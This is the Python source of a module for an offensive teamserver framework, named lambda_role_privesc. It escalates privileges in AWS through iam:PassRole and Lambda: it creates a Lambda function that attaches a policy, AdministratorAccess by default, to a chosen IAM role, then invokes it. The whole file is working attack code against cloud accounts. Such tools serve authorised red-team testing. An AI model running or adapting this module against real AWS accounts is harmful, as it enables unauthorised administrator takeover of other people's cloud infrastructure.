import shlex

import boto3

from rebelykos.core.response import Response as res
from rebelykos.core.teamserver.module import Module


class RLModule(Module):
    def __init__(self):
        super().__init__()
        self.name = "lambda_role_privesc"
        self.description = ("Elevate privilege by using iam:PassRole, "
                            "lambda:CreateFunction, and "
                            "lambda:InvokeFunction. "
                            "(and lambda:DeleteFunction")
        self.author = "Takahiro Yokoyama"
        self.options["RoleName"] = {
            "Description": ("The name (friendly name, not ARN) of"
                            " the role to attach the policy to."),
            "Required": True,
            "Value": ""
        }
        self.options["PolicyArn"] = {
            "Description": ("The Amazon Resource Name (ARN) of "
                            "the IAM policy you want to attach."),
            "Required": True,
            "Value": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
        self.options["RoleArn"] = {
            "Description": ("The Amazon Resource Name (ARN) of"
                            " the function's execution role."),
            "Required": True,
            "Value": ""
        }

    def run(self):
        client = boto3.client("lambda", **self["profile"])
        role = shlex.quote(self["RoleName"])
        policyarn = shlex.quote(self["PolicyArn"])
        # I'm afraid this is really secure
        lambda_privesc = f"""
import boto3


def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_role_policy(
        RoleName='{role}',
        PolicyArn='{policyarn}'
    )
    return response
"""

        for result in self._lambda_privesc(lambda_privesc,
                                           self["RoleArn"],
                                           client):
            yield result

        yield res.END, "End"
